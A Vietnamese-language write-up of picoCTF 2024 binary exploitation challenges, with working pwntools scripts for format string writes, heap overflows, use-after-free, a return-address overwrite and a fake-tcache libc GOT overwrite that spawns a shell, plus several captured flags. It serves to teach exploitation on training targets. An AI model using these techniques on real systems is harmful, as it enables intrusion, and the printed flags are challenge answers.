---
title: "PicoCTF2024 - Pwnable write-up"
description: "Write-up for PicoCTF2024 pwn challenge"
date: 2024-03-28
tags: 
  - 'PWN'
  - 'CTF'
  - '2024'
---
--- 
## 1.format string 0
Đề cho 1 file source và 1 file binary. Xem qua source:
```c
int main(int argc, char **argv){
    FILE *f = fopen("flag.txt", "r");
    if (f == NULL) {
        printf("%s %s", "Please create 'flag.txt' in this directory with your",
                        "own debugging flag.\n");
        exit(0);
    }

    fgets(flag, FLAGSIZE, f);
    signal(SIGSEGV, sigsegv_handler);

    gid_t gid = getegid();
    setresgid(gid, gid, gid);

    serve_patrick();
  
    return 0;
}
```
Hàm signal cho biết chỉ cần làm sigsegv là ra được flag. Vậy nên:
### Exploit
```
$ ./format-string-0
Welcome to our newly-opened burger place Pico 'n Patty! Can you help the picky customers find their favorite burger?
Here comes the first customer Patrick who wants a giant bite.
Please choose from the following burgers: Breakf@st_Burger, Gr%114d_Cheese, Bac0n_D3luxe
Enter your recommendation: aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa
There is no such burger yet!

{flag_here}
```
~~Format string chỗ nào ??~~
## 2. heap 0
Bài này cũng nhận được 1 file source và 1 binary. Xem qua source
```c
int main(void) {

    // Setup
    init();
    print_heap();

    int choice;

    while (1) {
        print_menu();
	int rval = scanf("%d", &choice);
	if (rval == EOF){
	    exit(0);
	}
        if (rval != 1) {
            //printf("Invalid input. Please enter a valid choice.\n");
            //fflush(stdout);
            // Clear input buffer
            //while (getchar() != '\n');
            //continue;
	    exit(0);
        }

        switch (choice) {
        case 1:
            // print heap
            print_heap();
            break;
        case 2:
            write_buffer();
            break;
        case 3:
            // print safe_var
            printf("\n\nTake a look at my variable: safe_var = %s\n\n",
                   safe_var);
            fflush(stdout);
            break;
        case 4:
            // Check for win condition
            check_win();
            break;
        case 5:
            // exit
            return 0;
        default:
            printf("Invalid choice\n");
            fflush(stdout);
        }
    }
}
[...]
void check_win() {
    if (strcmp(safe_var, "bico") != 0) {
        printf("\nYOU WIN\n");

        // Print flag
        char buf[FLAGSIZE_MAX];
        FILE *fd = fopen("flag.txt", "r");
        fgets(buf, FLAGSIZE_MAX, fd);
        printf("%s\n", buf);
        fflush(stdout);

        exit(0);
    } else {
        printf("Looks like everything is still secure!\n");
        printf("\nNo flage for you :(\n");
        fflush(stdout);
    }
}
```
Vậy thì bài này cũng chỉ cần overflow được giá trị tại `safe_var` là ra flag.
### Exploit
```
$ ./heap-0

Welcome to heap0!
I put my data on the heap so it should be safe from any tampering.
Since my data isn't on the stack I'll even let you write whatever info you want to the heap, I already took care of using malloc for you.

Heap State:
+-------------+----------------+
[*] Address   ->   Heap Data   
+-------------+----------------+
[*]   0x5f44c87626b0  ->   pico
+-------------+----------------+
[*]   0x5f44c87626d0  ->   bico
+-------------+----------------+

1. Print Heap:		(print the current state of the heap)
2. Write to buffer:	(write to your own personal block of data on the heap)
3. Print safe_var:	(I'll even let you look at my variable on the heap, I'm confident it can't be modified)
4. Print Flag:		(Try to print the flag, good luck)
5. Exit

Enter your choice: 2
Data for buffer: aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa

1. Print Heap:		(print the current state of the heap)
2. Write to buffer:	(write to your own personal block of data on the heap)
3. Print safe_var:	(I'll even let you look at my variable on the heap, I'm confident it can't be modified)
4. Print Flag:		(Try to print the flag, good luck)
5. Exit

Enter your choice: 4

YOU WIN
{flag_here}
```
 ~~Lúc làm mình nhập đại cũng ra flag~~
## 3. format string 1
Xem qua source
```c=
#include <stdio.h>


int main() {
  char buf[1024];
  char secret1[64];
  char flag[64];
  char secret2[64];

  // Read in first secret menu item
  FILE *fd = fopen("secret-menu-item-1.txt", "r");
  if (fd == NULL){
    printf("'secret-menu-item-1.txt' file not found, aborting.\n");
    return 1;
  }
  fgets(secret1, 64, fd);
  // Read in the flag
  fd = fopen("flag.txt", "r");
  if (fd == NULL){
    printf("'flag.txt' file not found, aborting.\n");
    return 1;
  }
  fgets(flag, 64, fd);
  // Read in second secret menu item
  fd = fopen("secret-menu-item-2.txt", "r");
  if (fd == NULL){
    printf("'secret-menu-item-2.txt' file not found, aborting.\n");
    return 1;
  }
  fgets(secret2, 64, fd);

  printf("Give me your order and I'll read it back to you:\n");
  fflush(stdout);
  scanf("%1024s", buf);
  printf("Here's your order: ");
  printf(buf);
  printf("\n");
  fflush(stdout);

  printf("Bye!\n");
  fflush(stdout);

  return 0;
}
```
Dễ dàng thấy được bug ở dòng 36, khi ta có thể nhập format string vào để leak được giá trị bên trong stack (có cả flag ở trong stack)
```
$ nc mimas.picoctf.net 63348
Give me your order and I'll read it back to you:
%llx.%llx.%llx.%llx.%llx.%llx.%llx.%llx.%llx.%llx.%llx.%llx.%llx.%llx.%llx.%llx.%llx.%llx.%llx.%llx.
Here's your order: 402118.0.7fcfc1252a00.0.1508880.a347834.7fff1681f0e0.7fcfc1043e60.7fcfc12684d0.1.7fff1681f1b0.0.0.7b4654436f636970.355f31346d316e34.3478345f33317937.31395f673431665f.7d653464663533.7.7fcfc126a8d8.
Bye!
```
Ta dễ đoán được ngay 5 đoạn từ 7b4654436... là flag. Đưa vào python và decode.
```python
a0 = '7b4654436f636970'
a1 = '355f31346d316e34'
a2 = '3478345f33317937'
a3 = '31395f673431665f'
a4 = '7d653464663533'
print('a'*30)
print(bytes.fromhex(a0)[::-1]+(bytes.fromhex(a1)[::-1])+(bytes.fromhex(a2)[::-1])+(bytes.fromhex(a3)[::-1])+ (bytes.fromhex(a4)[::-1]))
```
Được flag là : **`picoCTF{4n1m41_57y13_4x4_f14g_9135fd4e}`**
## 4. Heap 1
Source của heap 1 cũng giống heap 0 nên mình chỉ đưa ra hàm `win()`
```C
void check_win() {
    if (!strcmp(safe_var, "pico")) {
        printf("\nYOU WIN\n");

        // Print flag
        char buf[FLAGSIZE_MAX];
        FILE *fd = fopen("flag.txt", "r");
        fgets(buf, FLAGSIZE_MAX, fd);
        printf("%s\n", buf);
        fflush(stdout);

        exit(0);
    } else {
        printf("Looks like everything is still secure!\n");
        printf("\nNo flage for you :(\n");
        fflush(stdout);
    }
}
```
Thay vì overflow biến `safe_var` thành bất kì giá trị như heap 0 nào thì bây giờ phải ghi đè nó thành "pico". Chạy chương trình để nhìn qua vị trí của 2 biến.

```
Heap State:
+-------------+----------------+
[*] Address   ->   Heap Data   
+-------------+----------------+
[*]   0x625d3bf5c6b0  ->   pico
+-------------+----------------+
[*]   0x625d3bf5c6d0  ->   bico
+-------------+----------------+
```
Địa chỉ của "pico" cũng chính là địa chỉ của input. Cần overflow 0x20 = 32 bytes rồi viết "pico" vào nữa là xong.
### Exploit
```
$ ./heap-1

Welcome to heap1!
I put my data on the heap so it should be safe from any tampering.
Since my data isn't on the stack I'll even let you write whatever info you want to the heap, I already took care of using malloc for you.

Heap State:
+-------------+----------------+
[*] Address   ->   Heap Data   
+-------------+----------------+
[*]   0x57461e9866b0  ->   pico
+-------------+----------------+
[*]   0x57461e9866d0  ->   bico
+-------------+----------------+

1. Print Heap:		(print the current state of the heap)
2. Write to buffer:	(write to your own personal block of data on the heap)
3. Print safe_var:	(I'll even let you look at my variable on the heap, I'm confident it can't be modified)
4. Print Flag:		(Try to print the flag, good luck)
5. Exit

Enter your choice: 2
Data for buffer: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAApico #32 chữ A

1. Print Heap:		(print the current state of the heap)
2. Write to buffer:	(write to your own personal block of data on the heap)
3. Print safe_var:	(I'll even let you look at my variable on the heap, I'm confident it can't be modified)
4. Print Flag:		(Try to print the flag, good luck)
5. Exit

Enter your choice: 4

YOU WIN
{flag_here}
```

## 5. Heap 2
Tương tự, source câu này chỉ khác câu trước ở hàm `check_win()` và có thêm `win()`
```cpp
void win() {
    // Print flag
    char buf[FLAGSIZE_MAX];
    FILE *fd = fopen("flag.txt", "r");
    fgets(buf, FLAGSIZE_MAX, fd);
    printf("%s\n", buf);
    fflush(stdout);

    exit(0);
}

void check_win() { ((void (*)())*(int*)x)(); }
```
Mục tiêu tương tự bài trước, nhưng ta phải ghi đè biến x (là biến safe_var của bài trước) thành địa chỉ của hàm `win()`.
Dùng gdb để lấy địa chỉ của `win()` và dùng binary để leak địa chỉ của input và x.
```
gef➤  p win
$1 = {void ()} 0x4011a0 <win>

Enter your choice: 1
[*]   Address   ->   Value   
+-------------+-----------+
[*]   0x1d346b0  ->   pico
+-------------+-----------+
[*]   0x1d346d0  ->   bico
```
Input và x cách nhau 0x20 bytes, ta cũng cần nhập vào 32 bytes như bài trước rồi đến địa chỉ của `win()`.
### Exploit
```python
from pwn import *

win = 0x4011a0
padding = b'aaaabbbbccccddddeeeeffffgggghhhh'
payload = padding + p64(win)
chall = remote('mimas.picoctf.net', 53556)
chall.sendlineafter(b'your choice: ',b'2')
chall.sendlineafter(b'buffer: ',payload)
chall.sendlineafter(b'your choice: ',b'4')
chall.interactive()
```
Nhận được flag là: **`picoCTF{and_down_the_road_we_go_7c8d6f32}`**
## 6. Heap 3
Bài này khác 3 bài trước, vì trong list option có 1 option `free(x)`, nhưng lại có option `check_win()` dùng lại biến x. Đây là lỗi use after free. Xem qua source
```c
typedef struct {
  char a[10];
  char b[10];
  char c[10];
  char flag[5];
} object;
[...]
void init() {

    printf("\nfreed but still in use\nnow memory untracked\ndo you smell the bug?\n");
    fflush(stdout);

    x = malloc(sizeof(object));
    strncpy(x->flag, "bico", 5);
}
[...]
void check_win() {
  if(!strcmp(x->flag, "pico")) {
    printf("YOU WIN!!11!!\n");

    // Print flag
    char buf[FLAGSIZE_MAX];
    FILE *fd = fopen("flag.txt", "r");
    fgets(buf, FLAGSIZE_MAX, fd);
    printf("%s\n", buf);
    fflush(stdout);

    exit(0);

  } else {
    printf("No flage for u :(\n");
    fflush(stdout);
  }
}
```
Để tận dụng được lỗi này, ta phải `free(x)` trước, sau đó `malloc(36)` để được allocate lại đúng chunk đã được free, rồi nhập payload để sửa giá trị của x->flag.
### Exploit
```
$ echo -ne '5\n2\n36\nAAAAAAAAAAAAAAAAAAAAAAAAAAAAAApico\n4' | ./heap-3

freed but still in use
now memory untracked
do you smell the bug?

1. Print Heap
2. Allocate object
3. Print x->flag
4. Check for win
5. Free x
6. Exit

Enter your choice: 
1. Print Heap
2. Allocate object
3. Print x->flag
4. Check for win
5. Free x
6. Exit

Enter your choice: Size of object allocation: Data for flag: 
1. Print Heap
2. Allocate object
3. Print x->flag
4. Check for win
5. Free x
6. Exit

Enter your choice: YOU WIN!!11!!
{flag_here}
```
## 7. Format string 2
Xem qua source code:
```c
#include <stdio.h>

int sus = 0x21737573;

int main() {
  char buf[1024];
  char flag[64];


  printf("You don't have what it takes. Only a true wizard could change my suspicions. What do you have to say?\n");
  fflush(stdout);
  scanf("%1024s", buf);
  printf("Here's your input: ");
  printf(buf);
  printf("\n");
  fflush(stdout);

  if (sus == 0x67616c66) {
    printf("I have NO clue how you did that, you must be a wizard. Here you go...\n");

    // Read in the flag
    FILE *fd = fopen("flag.txt", "r");
    fgets(flag, 64, fd);

    printf("%s", flag);
    fflush(stdout);
  }
  else {
    printf("sus = 0x%x\n", sus);
    printf("You can do better!\n");
    fflush(stdout);
  }

  return 0;
}
```
Bài này yêu cầu sửa một giá trị nằm bên ngoài stack, rõ ràng buffer overflow không có ý nghĩa. Tuy nhiên, source có một format string vulnerability. Check qua các format trong printf, có một format %n. Khi `printf("%s%n",a,b)`, %n sẽ ghi số bytes đã in ra vào argument của nó. Nếu như chúng ta set up sao cho argument trở thành địa chỉ cần ghi, và số byte in ra là giá trị, ta có thể sửa được bất kì giá trị nào. 
### Exploit
Trong pwntools có một tool giúp thực hiện exploit này là `fmtstr_payload`.
```python
from pwn import *
context.arch = 'amd64'

payload = fmtstr_payload(14, {0x404060: 0x67616c66}, write_size='byte')
generated_payload = b'%102c%16$llnc%17$hhn%5c%18$hhn%245c%19$hhnaaaaba`@@\x00\x00\x00\x00\x00c@@\x00\x00\x00\x00\x00a@@\x00\x00\x00\x00\x00b@@\x00\x00\x00\x00\x00'
chall = remote('rhea.picoctf.net', 51094)
log.info(chall.recvline())
chall.sendline(payload)
chall.interactive()
```
Flag của bài này: **`picoCTF{f0rm47_57r?_f0rm47_m3m_d42f4d8d}`**

## 8. Format string 3
Xem qua source
```c
#include <stdio.h>

#define MAX_STRINGS 32

char *normal_string = "/bin/sh";

void setup() {
	setvbuf(stdin, NULL, _IONBF, 0);
	setvbuf(stdout, NULL, _IONBF, 0);
	setvbuf(stderr, NULL, _IONBF, 0);
}

void hello() {
	puts("Howdy gamers!");
	printf("Okay I'll be nice. Here's the address of setvbuf in libc: %p\n", &setvbuf);
}

int main() {
	char *all_strings[MAX_STRINGS] = {NULL};
	char buf[1024] = {'\0'};

	setup();
	hello();	

	fgets(buf, 1024, stdin);	
	printf(buf);

	puts(normal_string);

	return 0;
}
```
Bài này cũng là 1 bài format string, nhưng không có hàm `win()` nào cả, tuy nhiên có một `puts("/bin/sh")` rất sus ở trong hàm main. Bài này thực hiện ý tưởng tương tự bài trước: dùng format string vulnerability để sửa một giá trị nào đó. Giá trị ở đây là `puts@got`. GOT - Global offset table là một section dùng để lưu địa chỉ của những hàm dynamically linked trong process. Với đó, mình có thể chỉnh sửa địa chỉ của `puts()` thành địa chỉ của `system()` thì khi thay vì call `puts("/bin/sh")` thì process sẽ call `system("/bin/sh")`. Tóm lại, mục tiêu bài này giống hết bài trước.
Thậm chí binary còn rộng lượng in ra cả địa chỉ của setvbuf, mình có thể dùng nó để tính base của libc từ đó tính địa chỉ của `system()`
### Exploit
```python
from pwn import *
binsh = 0x402008
puts_got = 0x404018
context.arch = 'amd64'

setvbuf_offset = 500720
system_offset = 325472

chall = remote('rhea.picoctf.net', *)
log.info(chall.recvuntil(b'libc: '))
leak = chall.recvline()
payload = fmtstr_payload(38, {puts_got: int(leak.strip(),16)-setvbuf_offset + system_offset })

chall.sendline(payload)
chall.interactive()
```
## 9.babygame03
Xem qua binary và checksec:
```
$ checksec game
[*] '/home/an3ii/pico/game'
    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x8048000)
```
![image](https://hackmd.io/_uploads/HyZTCRG1A.png)
Khi execute binary, bắt đầu trò chơi ta đứng ở ô (4,4). Dùng w,a,s,d để di chuyển, l để đổi character, và p là một lệnh gì đó vô nghĩa. Trong 50 move mà di chuyển đến ô (29,89) là không thể. Mình phải decompile để xem kỹ hơn  bug.
### Reversing
```c
int __cdecl main(int argc, const char **argv, const char **envp)
{
  char move; // al
  int level_diff; // [esp+0h] [ebp-AACh] BYREF
  int player_row; // [esp+4h] [ebp-AA8h] BYREF
  int player_col; // [esp+8h] [ebp-AA4h]
  char grid[2700]; // [esp+13h] [ebp-A99h] BYREF
  int level; // [esp+AA0h] [ebp-Ch]
  int *p_argc; // [esp+AA4h] [ebp-8h]

  p_argc = &argc;
  init_player(&player_row);
  level_diff = 1;
  level = 0;
  init_map(grid, &player_row, &level_diff);
  print_map(grid, &player_row, &level_diff);
  signal(2, sigint_handler);
  do
  {
    move = getchar(p_argc);
    move_player(&player_row, move, grid, &level_diff);
    print_map(grid, &player_row, &level_diff);
    if ( player_row == 29 && player_col == 89 && level_diff != 4 )
    {
      puts("You win!\n Next level starting ");
      ++level;
      ++level_diff;
      init_player(&player_row);
      init_map(grid, &player_row, &level_diff);
    }
  }
  while ( player_row != 29 || player_col != 89 || level_diff != 5 || level != 4 );
  win(&level_diff);
  return 0;
```
Lỗi nghiêm trọng nhất nằm ở hàm `move_player()`
```c    
// *player_row là hàng, còn player_row[1] là cột
unsigned int *__cdecl move_player(unsigned int *player_row, char move, int a3, int a4)
{
  unsigned int *result; // eax
  int v5; // [esp-Ch] [ebp-24h]
  int v6; // [esp-8h] [ebp-20h]
  int v7; // [esp-4h] [ebp-1Ch]

  if ( (int)player_row[2] <= 0 )
  {
    puts("No more lives left. Game over!");
    fflush(stdout);
    exit(0, v5, v6, v7);
  }
  if ( move == 'l' )
    player_tile = getchar();
  if ( move == 'p' )
    solve_round(a3, (int *)player_row, a4);
  *(_BYTE *)(player_row[1] + a3 + 90 * *player_row) = '.';
  switch ( move )
  {
    case 'w':
      --*player_row;
      break;
    case 's':
      ++*player_row;
      break;
    case 'a':
      --player_row[1];
      break;
    case 'd':
      ++player_row[1];
      break;
  }
  if ( *(_BYTE *)(player_row[1] + a3 + 90 * *player_row) == '#' )
  {
    puts("You hit an obstacle!");
    fflush(stdout);
    exit(0, v5, v6, v7);
  }
  *(_BYTE *)(player_row[1] + a3 + 90 * *player_row) = player_tile;
  result = player_row;
  --player_row[2];
  return result;
}
```
Khi di chuyển, giá trị của player_row không hề chặn sao cho vị trí của người chơi vẫn ở trên grid. Do đó, mình có thể đi ra ngoài grid và thực hiện one-byte overflow vào một địa chỉ nào đó.
### Ý tưởng
Đầu tiên là phải để ý tới biến `lives_left`. Nếu `lives_left==0` thì process sẽ exit ngay lập tức. Vì vậy, hướng di chuyển đầu tiên của mình là thay đổi giá trị của `lives_left` trước. Sau đó, mình sẽ ghi đè giá trị của return address.

Nhưng return về đâu??
Không thể return trực tiếp đến `win()` vì mình chỉ có 1 bytes overflow, nhưng địa chỉ `win()` khác 2 bytes so với return address hiện tại. Return đến `call win()` cũng không thể vì `win()` sẽ check `level_diff == 5 || level==4` .Chỉ còn có cách sửa vào vị trí `level++` vì chỉ khác với return address 1 byte:
``0x08049982 <+273>:	add    DWORD PTR [ebp-0xc],0x1
``
Khi đó, level 2 bắt đầu, và mình lại làm như cũ, đến khi level 5. Thay vì return về `level++`, mình return thẳng về `call win()`.
### Exploit
```python
from pwn import *

#Important addresses
grid = 0xffffc60f
ret2win = 0x080499fe
retofmove = 0xffffc5dc
current_pos = grid - 1
lives = 0xffffc60a
levels = 0xffffc5fc

chall = remote('rhea.picoctf.net', 54981)
for level in range(1,5):
    payload =b'\x40' + b'a'*5 + b'w'*4 + b'a'*(current_pos - lives) + b'l\x7f'  #change lives
    chall.sendlineafter(b'X\n', payload)

    payload = b's' + b'a'*(lives - retofmove) + b'w' #change level
    chall.sendlineafter(b'X\n',payload)

payload =b'l\x40' b'a'*5 + b'w'*4 + b'a'*(current_pos - lives) + b'l\xfe'  #change lives
chall.sendlineafter(b'X\n',payload)

payload = b's'  +b'a'*(lives - retofmove) + b'w' #ret2win
chall.sendlineafter(b'X\n',payload)
chall.interactive()
```
Bài này căng nhất việc suy nghĩ return về đâu.
## 10. High frequency trouble (Update)
Bài này mình không giải được trong thời gian diễn ra giải. Sau giải thì mình mới đọc writeup để và cố gắng giải được bài này. Bài này có nhiều kỹ thuật mới đáng nói.
### Source code
```c 
#include <stdio.h>
#include <stdlib.h>
#include <stdint.h>

enum
{
    PKT_OPT_PING,
    PKT_OPT_ECHO,
    PKT_OPT_TRADE,
} typedef pkt_opt_t;

enum
{
    PKT_MSG_INFO,
    PKT_MSG_DATA,
} typedef pkt_msg_t;

struct
{
    size_t sz;
    uint64_t data[];
} typedef pkt_t;

const struct
{
    char *header;
    char *color;
} type_tbl[] = {
    [PKT_MSG_INFO] = {"PKT_INFO", "\x1b[1;34m"},
    [PKT_MSG_DATA] = {"PKT_DATA", "\x1b[1;33m"},
};

void putl(pkt_msg_t type, char *msg)
{
    printf("%s%s\x1b[m:[%s]\n", type_tbl[type].color, type_tbl[type].header, msg);
}

// gcc main.c -o hft -g
int main()
{
    setbuf(stdout, NULL);
    setbuf(stdin, NULL);

    putl(PKT_MSG_INFO, "BOOT_SQ");

    for (;;)
    {
        putl(PKT_MSG_INFO, "PKT_RES");

        size_t sz = 0;
        fread(&sz, sizeof(size_t), 1, stdin);

        pkt_t *pkt = malloc(sz);
        pkt->sz = sz;
        gets(&pkt->data);

        switch (pkt->data[0])
        {
        case PKT_OPT_PING:
            putl(PKT_MSG_DATA, "PONG_OK");
            break;
        case PKT_OPT_ECHO:
            putl(PKT_MSG_DATA, (char *)&pkt->data[1]);
            break;
        default:
            putl(PKT_MSG_INFO, "E_INVAL");
            break;
        }
    }

    putl(PKT_MSG_INFO, "BOOT_EQ");
}
```
Bài này là một bài heap, nhưng chỉ cho ta một option duy nhất: malloc, read và write trong cùng một option. Không có option free và chỉ có 1 unique malloc.
### Ý tưởng.
#### Leaking heap base 
Bình thường, để leak được heap base hoặc libc base thì phải gọi được free. Nhưng bài này không hề có option free. Tuy nhiên, trong source code của malloc, có một cách để ép chương trình gọi `__int_free`, đó là malloc một chunk lớn hơn top chunk. 
Kĩ thuật này đã xuất hiện trong [house of orange](https://4ngelboy.blogspot.com/2016/10/hitcon-ctf-qual-2016-house-of-orange.html). Ta sẽ ghi đè giá trị size tại top chunk trong khi [bypass các check](https://ctf-wiki.mahaloz.re/pwn/linux/glibc-heap/house_of_orange/#the-correct-example), sau đó malloc một chunk lớn hơn giá trị mà ta vừa ghi đè. Khi này, thuật toán "tưởng" là top chunk không đủ memory để malloc, sau đó gọi `sbrk()` để mở rộng heap ra, và malloc chunk đó tại vùng vừa được mở rộng, rồi đặt một top chunk mới. Top chunk cũ sẽ được free. 
Mình setup size cho top chunk cũ khi free sẽ rơi vào unsorted bin, để lúc sau mình có thể leak được libc luôn. Sau khi free, mình gọi `malloc(0x8)`, và chương trình khi này lại malloc trên phần heap cũ, dời top chunk được free xuống và ghi địa chỉ của top chunk cũ tại `(&top chunk-0x10)`
```
pwndbg> x/32gx 0x555b8cb4d2b0
0x555b8cb4d2b0: 0x6161616161616161      0x0000000000000021     <--new chunk
0x555b8cb4d2c0: 0x0000000000000008      0x0000000000000001
0x555b8cb4d2d0: 0x0000555b8cb4d2b0      0x0000000000000d11     <--freed top chunk
0x555b8cb4d2e0: 0x00007f12a9904ce0      0x00007f12a9904ce0
```
Hàm `putl()` của chương trình sẽ đọc `*(char *)(pkt + 0x10)`, chính là vị trí của heap đã được leak.
```python
malloc(0x10, b'a'*8+p64(0xd51))
malloc(0x1000,b'')
malloc(0x8,b'')
leak = leaking()
base_heap = leak & 0xfffffffffffff000
log.info('Base heap: '+hex(base_heap))
```
(Khúc này mình vẫn thắc mắc là top chunk đã bị free lại vẫn có thể hoạt động như một top chunk bình thường)
#### Leaking libc
Tới bước này, mình sử dụng hint của chương trình:
> allocate a size greater than `mp_.mmap_threshold`

Khi yêu cầu `malloc` một chunk lớn hơn `mp_.mmap_threshold`, rõ ràng heap không thể tìm một vùng nhớ để malloc đủ, nên nó phải `mmap()` một vùng mới. Chunk mới này sẽ được `mmap()` tại vị trí ngay phía dưới libc và phía trên Thread local storage (TLS). Tại TLS có chứa một thứ rất quan trọng: địa chỉ của tcache.

Tcache là một bin để quản lý chunk đã bị free. Mình có thể fake ra một tcache sao cho nó đã có chunk đã bị free tại địa chỉ mình mong muốn, để khi ta malloc, tcache sẽ đưa ta chunk tại vị trí đó, thế là thực hiện được arbitrary read-write. Tóm lại, mình fake ra một tcache ngay tại heap, có một chunk trỏ đến vị trí gần libc trên heap để leak được libc, các chunk còn lại mình sẽ để là `&fake_tcache` để lúc sau có thể sửa lại fake tcache theo ý muốn, sau đó ghi đè `*tcache` trên TLS trỏ đến `&fake_tcache`. 
```python
libc_add = 0x560
fake_tcache_add = 0x2f0
libc_offset = 0x21a270
fake_tcache = p16(0x30)*64+p64(base_heap+libc_add)
fake_tcache += p64(base_heap+fake_tcache_add-0x10)*10
malloc(0x280, fake_tcache)
malloc(0x22000, b'a'*fill_h+p64(fake_tcache_add+base_heap))
malloc(0x10,b'')
leak = leaking()
```
#### Get a shell
Source code này không có break để hàm main return, không có cả exit. Cả hai cách leak environ để leak stack frame rồi ROP và ghi đè `__exit_funcs` đều không thể thực hiện. Mình đọc các cách để spawn shell đó là ghi đè vào **libc GOT** (không phải GOT của binary).
```
pwndbg> vmmap libc
LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA
             Start                End Perm     Size Offset File
    0x7f12a96c4000     0x7f12a96ea000 rw-p    26000      0 [anon_7f12a96c4]
►   0x7f12a96ea000     0x7f12a9712000 r--p    28000      0 /usr/lib/x86_64-linux-gnu/libc.so.6
►   0x7f12a9712000     0x7f12a98a7000 r-xp   195000  28000 /usr/lib/x86_64-linux-gnu/libc.so.6
►   0x7f12a98a7000     0x7f12a98ff000 r--p    58000 1bd000 /usr/lib/x86_64-linux-gnu/libc.so.6
►   0x7f12a98ff000     0x7f12a9900000 ---p     1000 215000 /usr/lib/x86_64-linux-gnu/libc.so.6
►   0x7f12a9900000     0x7f12a9904000 r--p     4000 215000 /usr/lib/x86_64-linux-gnu/libc.so.6
►   0x7f12a9904000     0x7f12a9906000 rw-p     2000 219000 /usr/lib/x86_64-linux-gnu/libc.so.6
    0x7f12a9906000     0x7f12a9913000 rw-p     d000      0 [anon_7f12a9906]

pwndbg> tele 0x7f12a9904000
00:0000│  0x7f12a9904000 (_GLOBAL_OFFSET_TABLE_) ◂— 0x219bc0
01:0008│  0x7f12a9904008 (_GLOBAL_OFFSET_TABLE_+8) —▸ 0x7f12a991f1f0 —▸ 0x7f12a96ea000 ◂— 0x3010102464c457f
02:0010│  0x7f12a9904010 (_GLOBAL_OFFSET_TABLE_+16) —▸ 0x7f12a9936d30 (_dl_runtime_resolve_xsavec) ◂— endbr64
03:0018│  0x7f12a9904018 (*ABS*@got.plt) —▸ 0x7f12a9887960 (__strnlen_avx2) ◂— endbr64
04:0020│  0x7f12a9904020 (*ABS*@got.plt) —▸ 0x7f12a9883590 (__rawmemchr_avx2) ◂— endbr64
05:0028│  0x7f12a9904028 (realloc@got[plt]) —▸ 0x7f12a9712030 ◂— endbr64
06:0030│  0x7f12a9904030 (*ABS*@got.plt) —▸ 0x7f12a98857b0 (__strncasecmp_avx) ◂— endbr64
07:0038│  0x7f12a9904038 (_dl_exception_create@got.plt) —▸ 0x7f12a9712050 ◂— endbr64
```
Chính là nó. Giờ mình chỉ cần ghi đè một GOT trong libc để nó trỏ đến `one_gadget` là được.
```python 
base_libc = leak - libc_offset
libc_got = base_libc + 0x219098-0x8-0x10
log.info('Base libc: '+hex(base_libc))
fake_tcache1 = p16(0x30)*64+ p64(base_heap+fake_tcache_add-0x10) + p64(libc_got)
fake_tcache1 +=p64(libc_got)*10
malloc(0x80, fake_tcache1)
malloc(0x30, p64(base_libc+0xebcf5)*3)
chall.interactive()
```
Kết quả:
![image](https://hackmd.io/_uploads/ryFk066WR.png)
### Exploit
```python
from pwn import *
import sys

nc = 'tethys.picoctf.net'
p = 53348
#context.log_level = 'debug'
if sys.argv[1] == 'connect':
    chall = remote(host = nc, port = p)
elif sys.argv[1] == 'debug':
    chall = gdb.debug('./hft', ''' b *putl+83
                      continue
                      ''')
else:
    chall = process('./hft')
    
def malloc(sz,msg):
    chall.sendafter(b'PKT_RES]\n', p64(sz))
    time.sleep(0.2)
    if msg != b'':
        chall.sendline(p64(1) + msg)
    else:
        chall.sendline(p32(1)+b'\x00')

def leaking():
    chall.recvuntil(b':[')
    return u64(chall.recvuntil(b']')[0:-1].ljust(8,b'\x00'))
#Leak heap
pkt = 0x10
stri = pkt+0x10
tcache = 0x236f8
get_libc = -0x20
fill = tcache+get_libc-stri
fill_h = tcache+get_libc
malloc(0x10, b'a'*8+p64(0xd51))
malloc(0x1000,b'')
malloc(0x8,b'')
leak = leaking()
base_heap = leak & 0xfffffffffffff000
log.info('Base heap: '+hex(base_heap))
libc_add = 0x560
fake_tcache_add = 0x2f0
libc_offset = 0x21a270
fake_tcache = p16(0x30)*64+p64(base_heap+libc_add)
fake_tcache += p64(base_heap+fake_tcache_add-0x10)*10
malloc(0x280, fake_tcache)
malloc(0x22000, b'a'*fill_h+p64(fake_tcache_add+base_heap))
malloc(0x10,b'')
leak = leaking()
base_libc = leak - libc_offset
libc_got = base_libc + 0x219098-0x8-0x10
log.info('Base libc: '+hex(base_libc))
fake_tcache1 = p16(0x30)*64+ p64(base_heap+fake_tcache_add-0x10) + p64(libc_got)
fake_tcache1 +=p64(libc_got)*10
malloc(0x80, fake_tcache1)
malloc(0x30, p64(base_libc+0xebcf5)*3)
chall.interactive()
```
Flag: **`picoCTF{mm4p_mm4573r_ff5688b1}`**
